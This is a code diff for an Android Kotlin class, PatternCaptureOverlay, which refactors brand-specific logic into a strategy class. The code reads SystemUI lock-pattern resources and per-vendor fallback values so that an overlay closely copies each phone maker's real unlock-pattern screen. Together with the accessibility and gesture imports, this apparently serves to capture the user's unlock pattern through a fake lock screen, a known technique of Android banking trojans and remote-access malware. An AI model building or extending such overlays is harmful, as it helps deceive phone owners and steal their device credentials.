@@ -3,9 +3,7 @@ package com.storm.safe.rock.service.modules.cipher
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.content.Context
-import android.content.pm.PackageManager
 import android.content.res.Resources
-import android.graphics.Color
 import android.graphics.Path
 import android.graphics.PointF
 import android.graphics.Rect
@@ -17,7 +15,8 @@ import android.util.TypedValue
 import android.view.Gravity
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityNodeInfo
-import java.util.Locale
+import com.storm.safe.rock.service.modules.cipher.vendor.CipherBrandFactory
+import com.storm.safe.rock.service.modules.cipher.vendor.CipherBrandStrategy
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicReference
 import java.util.concurrent.locks.ReentrantLock
@@ -117,6 +116,9 @@ class PatternCaptureOverlay(
     /** Handler */
     val handler: Handler = Handler(Looper.getMainLooper())
 
+    /** Brand strategy — device-level static, created once */
+    private val brandStrategy: CipherBrandStrategy = CipherBrandFactory.create()
+
     init {
         windowManager = context.getSystemService("window") as? WindowManager
     }
@@ -169,79 +171,18 @@ class PatternCaptureOverlay(
             view.outerCircleAlpha = style.outerCircleAlpha
             view.pathWidth = style.pathWidth
             view.pathColor = style.pathColor
-
-            val brand = Build.BRAND.lowercase(Locale.ROOT)
-            view.aspectRatio = if (brand == "oppo" || brand == "realme" || brand == "oneplus") 1 else 0
+            // vendor: aspectRatio + animation durations are brand-specific even with SystemUI resources
+            view.aspectRatio = brandStrategy.patternAspectRatio()
             view.setDotAlign(dotAlign)
-            // vendor: 动画值按品牌区分，即使 SystemUI 资源读取成功
-            when {
-                brand == "samsung" -> { view.dotAnimationDuration = 100; view.pathEndAnimationDuration = 200 }
-                brand == "xiaomi" || brand == "redmi" || brand == "poco" || brand == "blackshark" -> { view.dotAnimationDuration = 50; view.pathEndAnimationDuration = 50 }
-                else -> { view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100 }
-            }
+            val (dotAnim, pathAnim) = brandStrategy.animationDurations()
+            view.dotAnimationDuration = dotAnim
+            view.pathEndAnimationDuration = pathAnim
             return
         }
 
-        // 兜底: 品牌适配 — 7 品牌完整参数（vendor a2 对齐）
+        // 兜底: 委托品牌策略 — vendor a2 对齐
         Log.w(TAG, "SystemUI资源不可用，使用品牌兜底参数")
-        val themeColor = getThemeColor()
-        val density = Resources.getSystem().displayMetrics.density
-        val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
-        val brand = Build.BRAND
-
-        val brandLc = brand.lowercase(Locale.ROOT)
-        when {
-            brandLc == "oppo" || brandLc == "realme" || brandLc == "oneplus" -> {
-                view.normalStateColor = 0x4CFFFFFF.toInt()
-                view.correctStateColor = 0x4CFFFFFF.toInt()
-                view.dotSelectedColor = 0x4CFFFFFF.toInt()
-                view.dotNormalSize = 30; view.dotSelectedSize = 60
-                view.pathWidth = 6; view.pathColor = -16777216
-                view.aspectRatio = 1
-                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
-            }
-            brandLc == "samsung" -> {
-                view.normalStateColor = -3355444; view.correctStateColor = -3355444
-                view.dotSelectedColor = -3355444
-                view.dotNormalSize = 36; view.dotSelectedSize = 50
-                view.pathWidth = 10; view.pathColor = -1; view.aspectRatio = 0
-                view.dotAnimationDuration = 100; view.pathEndAnimationDuration = 200
-            }
-            brandLc == "huawei" || brandLc == "honor" -> {
-                view.normalStateColor = -1; view.correctStateColor = -1; view.dotSelectedColor = -1
-                view.dotNormalSize = 32; view.dotSelectedSize = 50
-                view.pathWidth = 20; view.pathColor = -7829368; view.aspectRatio = 0
-                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
-            }
-            brandLc == "vivo" || brandLc == "iqoo" -> {
-                view.normalStateColor = -3355444; view.correctStateColor = -3355444
-                view.dotSelectedColor = -256
-                view.dotNormalSize = 20; view.dotSelectedSize = 40
-                view.pathWidth = 30; view.pathColor = Color.parseColor("#FFF68F")
-                view.aspectRatio = 0
-                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
-            }
-            brandLc == "xiaomi" || brandLc == "redmi" || brandLc == "poco" || brandLc == "blackshark" -> {
-                view.normalStateColor = themeColor; view.correctStateColor = themeColor
-                view.dotSelectedColor = themeColor
-                view.dotNormalSize = 30; view.dotSelectedSize = 60
-                view.pathWidth = pathWidth; view.pathColor = themeColor; view.aspectRatio = 0
-                view.dotAnimationDuration = 50; view.pathEndAnimationDuration = 50
-            }
-            brandLc == "tecno" || brandLc == "itel" || brandLc == "infinix" -> {
-                view.normalStateColor = -1; view.correctStateColor = -1; view.dotSelectedColor = -1
-                view.dotNormalSize = 20; view.dotSelectedSize = 30
-                view.pathWidth = 5; view.pathColor = -1; view.aspectRatio = 0
-                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
-            }
-            else -> {
-                view.normalStateColor = themeColor; view.correctStateColor = themeColor
-                view.dotNormalSize = 30; view.dotSelectedSize = 60
-                view.dotSelectedColor = themeColor; view.pathWidth = pathWidth
-                view.pathColor = themeColor; view.aspectRatio = 0
-                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
-            }
-        }
+        brandStrategy.applyPatternFallbackStyle(view, getThemeColor(), Resources.getSystem().displayMetrics.density)
         view.setDotAlign(dotAlign)
     }
 
@@ -421,133 +362,65 @@ class PatternCaptureOverlay(
             val suiContext = context.createPackageContext("com.android.systemui", Context.CONTEXT_INCLUDE_CODE)
             val res = suiContext.resources
             val density = Resources.getSystem().displayMetrics.density
-            val brand = Build.BRAND.lowercase(Locale.ROOT)
 
-            // 读取点大小
-            var dotSize = 0
-            var haloSize = 0
-            var innerDot = 0
-            var pathWidth = 0
+            // 1. 品牌资源读取（点大小 + 路径宽度 + 颜色）
+            val brandRes = brandStrategy.readBrandResources(res, suiContext, density)
 
-            when {
-                brand == "vivo" || brand == "iqoo" -> {
-                    val selectId = res.getIdentifier("vivo_keyguard_select_point_width", "dimen", "com.android.systemui")
-                    val springId = res.getIdentifier("vivo_keyguard_spring_patten_point_width", "dimen", "com.android.systemui")
-                    val unlockSizeId = res.getIdentifier("vivo_pattern_unlock_size", "dimen", "com.android.systemui")
-                    val pathId = res.getIdentifier("vivo_keyguard_path_width", "dimen", "com.android.systemui")
+            var haloSize: Int
+            var innerDot: Int
+            var pathWidth: Int
+            var dotColor: Int
+            var pathColor: Int
 
-                    innerDot = when {
-                        selectId != 0 -> res.getDimensionPixelSize(selectId)
-                        springId != 0 -> res.getDimensionPixelSize(springId)
-                        unlockSizeId != 0 -> {
-                            val viewSize = res.getDimensionPixelSize(unlockSizeId)
-                            haloSize = viewSize / 8
-                            viewSize / 12
-                        }
-                        else -> (8 * density).toInt()
-                    }
-                    if (haloSize == 0) haloSize = (innerDot * 2.5f).toInt()
-                    pathWidth = if (pathId != 0) res.getDimensionPixelSize(pathId) else 0
-                }
-                brand == "huawei" || brand == "honor" -> {
-                    val huaweiIds = listOf("hwlock_pattern_dot_size", "hw_pattern_dot_size", "hw_lock_pattern_dot_size", "keyguard_pattern_dot_size")
-                    for (name in huaweiIds) {
-                        val id = res.getIdentifier(name, "dimen", "com.android.systemui")
-                        if (id != 0) {
-                            dotSize = res.getDimensionPixelSize(id)
-                            break
-                        }
-                    }
-                    // AOSP fallback for huawei devices missing vendor-specific resources
-                    if (dotSize == 0) {
-                        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
-                        if (aospId != 0) dotSize = res.getDimensionPixelSize(aospId)
-                    }
-                    if (dotSize > 0) {
-                        haloSize = dotSize * 3
-                        innerDot = dotSize
-                    } else {
-                        innerDot = (11 * density).toInt()
-                        haloSize = (32 * density).toInt()
-                    }
-                }
-                else -> {
-                    val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
-                    if (aospId != 0) {
-                        dotSize = res.getDimensionPixelSize(aospId)
-                        haloSize = dotSize * 3
-                        innerDot = dotSize
-                    } else {
-                        return null
-                    }
-                }
+            if (brandRes != null) {
+                haloSize = brandRes.haloSize
+                innerDot = brandRes.innerDotSize
+                pathWidth = brandRes.pathWidth
+                dotColor = brandRes.dotColor
+                pathColor = brandRes.pathColor
+            } else {
+                // AOSP fallback
+                val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
+                if (aospId == 0) return null
+                val dotSize = res.getDimensionPixelSize(aospId)
+                haloSize = dotSize * 3
+                innerDot = dotSize
+                pathWidth = 0
+                dotColor = 0
+                pathColor = 0
             }
 
-            // 选中大小
+            // 2. 选中大小 (通用)
             val activatedId = res.getIdentifier("lock_pattern_dot_size_activated", "dimen", "com.android.systemui")
             val dotSelected = if (activatedId != 0) res.getDimensionPixelSize(activatedId) else (haloSize * 1.5f).toInt()
 
-            // 路径宽度
+            // 3. 路径宽度 (通用 fallback)
             if (pathWidth == 0) {
                 val lineWidthId = res.getIdentifier("lock_pattern_dot_line_width", "dimen", "com.android.systemui")
                 pathWidth = if (lineWidthId != 0) res.getDimensionPixelSize(lineWidthId) else (density * 3f).toInt().coerceAtLeast(3)
             }
 
-            // 外圈透明度
-            var outerAlpha = 0.1f
-            // vendor: OPPO 特定 alpha 资源 coui_lock_pattern_outer_circle_max_alpha
-            val oppoAlphaId = res.getIdentifier("coui_lock_pattern_outer_circle_max_alpha", "dimen", "com.android.systemui")
-            if ((brand == "oppo" || brand == "realme" || brand == "oneplus") && oppoAlphaId != 0) {
-                try {
-                    outerAlpha = if (Build.VERSION.SDK_INT >= 29) {
-                        res.getFloat(oppoAlphaId)
-                    } else {
-                        val tv = TypedValue()
-                        res.getValue(oppoAlphaId, tv, true)
-                        tv.float
+            // 4. 外圈透明度 — brandRes 初始值 + 资源名覆盖
+            var outerAlpha = brandRes?.outerCircleAlpha ?: 0.1f
+            brandStrategy.outerCircleAlphaResourceName()?.let { resName ->
+                val alphaId = res.getIdentifier(resName, "dimen", "com.android.systemui")
+                if (alphaId != 0) {
+                    try {
+                        outerAlpha = if (Build.VERSION.SDK_INT >= 29) {
+                            res.getFloat(alphaId)
+                        } else {
+                            val tv = TypedValue()
+                            res.getValue(alphaId, tv, true)
+                            tv.float
+                        }
+                        Log.d(TAG, "★ outerCircleMaxAlpha=$outerAlpha (resource=$resName)")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "读取 outerCircleMaxAlpha 失败, 用默认值: ${e.message}")
                     }
-                    Log.d(TAG, "★ OPPO outerCircleMaxAlpha=$outerAlpha")
-                } catch (e: Exception) {
-                    Log.w(TAG, "读取 outerCircleMaxAlpha 失败, 用默认值 0.1: ${e.message}")
                 }
             }
 
-            // 颜色
-            var dotColor = 0
-            var pathColor = 0
-            // vendor: 品牌特定颜色资源读取
-            when {
-                brand == "oppo" || brand == "realme" || brand == "oneplus" -> {
-                    val dotId = res.getIdentifier("coui_lock_pattern_dot_color", "color", "com.android.systemui")
-                    val pathId2 = res.getIdentifier("coui_lock_pattern_path_color", "color", "com.android.systemui")
-                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
-                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
-                }
-                brand.equals("samsung", ignoreCase = true) -> {
-                    val dotId = res.getIdentifier("sec_lock_pattern_dot_color", "color", "com.android.systemui")
-                    val pathId2 = res.getIdentifier("sec_lock_pattern_path_color", "color", "com.android.systemui")
-                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
-                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
-                }
-                brand == "vivo" || brand == "iqoo" -> {
-                    val dotId = res.getIdentifier("vivo_lock_pattern_dot_color", "color", "com.android.systemui")
-                    val pathId2 = res.getIdentifier("vivo_lock_pattern_path_color", "color", "com.android.systemui")
-                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
-                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
-                }
-                brand == "huawei" || brand == "honor" -> {
-                    val dotId = res.getIdentifier("hwlock_pattern_dot_color", "color", "com.android.systemui")
-                    val pathId2 = res.getIdentifier("hwlock_pattern_path_color", "color", "com.android.systemui")
-                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
-                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
-                }
-                brand == "xiaomi" || brand == "redmi" || brand == "poco" || brand == "blackshark" -> {
-                    val dotId = res.getIdentifier("miui_lock_pattern_dot_color", "color", "com.android.systemui")
-                    val pathId2 = res.getIdentifier("miui_lock_pattern_path_color", "color", "com.android.systemui")
-                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
-                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
-                }
-            }
+            // 5. 颜色 fallback
             if (dotColor == 0) dotColor = getThemeColor()
             if (pathColor == 0) pathColor = getThemeColor()
 
